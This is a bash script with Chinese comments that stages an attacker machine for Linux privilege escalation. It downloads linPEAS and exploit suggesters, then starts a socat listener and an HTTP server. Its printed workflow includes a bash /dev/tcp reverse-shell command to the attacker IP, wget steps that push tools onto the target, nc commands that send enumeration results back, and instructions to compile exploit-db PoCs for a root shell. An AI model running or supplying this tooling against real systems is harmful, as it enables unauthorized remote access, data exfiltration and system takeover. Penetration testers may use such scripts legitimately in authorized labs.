#!/bin/bash
# setup_listener.sh — 部署动态提权测试环境
# 不包含任何固定的 CVE 信息，所有漏洞匹配在探测目标后动态完成
# 用法: ./setup_listener.sh [LISTEN_PORT] [HTTP_PORT] [REV_SHELL_PORT]
# 默认: 6767 8888 8989

LPPORT=${1:-6767}
HPPORT=${2:-8888}
REVPORT=${3:-8989}
KALI_IP=$(ip -4 addr show eth0 2>/dev/null | grep -oP 'inet \K[\d.]+' | head -1)

echo "=================================================="
echo "  Linux PrivEsc — 动态提权环境"
echo "=================================================="
echo "[+] Kali IP: $KALI_IP"
echo "[+] 监听端口:            $LPPORT  (目标反弹 shell)"
echo "[+] HTTP 文件服务端口:    $HPPORT"
echo "[+] 反转 shell 端口:     $REVPORT  (用户自行监听)"
echo ""

# ---- 下载探测工具（不包含任何 exploit 源码）----
echo "[*] 下载 linPEAS..."
curl -sL -o /tmp/linpeas.sh "https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh"
chmod +x /tmp/linpeas.sh

echo "[*] 下载 Linux Exploit Suggester..."
curl -sL -o /tmp/les.sh \
  "https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh"
chmod +x /tmp/les.sh

echo "[*] 下载 LES2 (perl 版本)..."
curl -sL -o /tmp/les2.pl \
  "https://raw.githubusercontent.com/InteliSecureLabs/Linux_Exploit_Suggester/master/Linux_Exploit_Suggester.pl"
chmod +x /tmp/les2.pl

# ---- 创建 tmux 会话 ----
tmux new-session -d -s revshell 2>/dev/null
tmux send-keys -t revshell "socat TCP-LISTEN:$LPPORT,fork,reuseaddr -" Enter

# ---- HTTP 文件服务 ----
cd /tmp && python3 -m http.server "$HPPORT" &
echo "[+] HTTP 服务: http://$KALI_IP:$HPPORT/"

# ---- 使用说明 ----
echo ""
echo "=================================================="
echo "  📋 使用流程"
echo "=================================================="
echo ""
echo "1. 让目标反弹 shell 到 $KALI_IP:$LPPORT"
echo "   bash -i >& /dev/tcp/$KALI_IP/$LPPORT 0>&1"
echo ""
echo "2. 另开终端监听 root shell (提权后使用):"
echo "   nc -lvnp $REVPORT"
echo ""
echo "3. 上传探测工具到目标机 (通过 tmux 交互):"
echo "   tmux send-keys 'cd /tmp && wget -q http://$KALI_IP:$HPPORT/linpeas.sh && chmod +x linpeas.sh' Enter"
echo "   tmux send-keys './linpeas.sh | tee /tmp/peas-out.txt' Enter"
echo ""
echo "4. 取回结果并分析"
echo "   nc -lvp 9996 > /tmp/target_peas.txt &"
echo "   tmux send-keys 'nc $KALI_IP 9996 < /tmp/peas-out.txt' Enter"
echo ""
echo "5. 运行 exploit-suggester 动态匹配 CVE:"
echo "   tmux send-keys 'wget -q http://$KALI_IP:$HPPORT/les.sh -O les.sh && chmod +x les.sh && ./les.sh' Enter"
echo ""
echo "6. 根据 suggetser 输出 → 从 exploit-db 下载对应 PoC"
echo "   编译并执行 → 提权 → 反转 shell 到 $KALI_IP:$REVPORT"
echo ""
echo "=================================================="
echo "  ⚠️  不预设任何 CVE 信息，全部动态检测"
echo "=================================================="
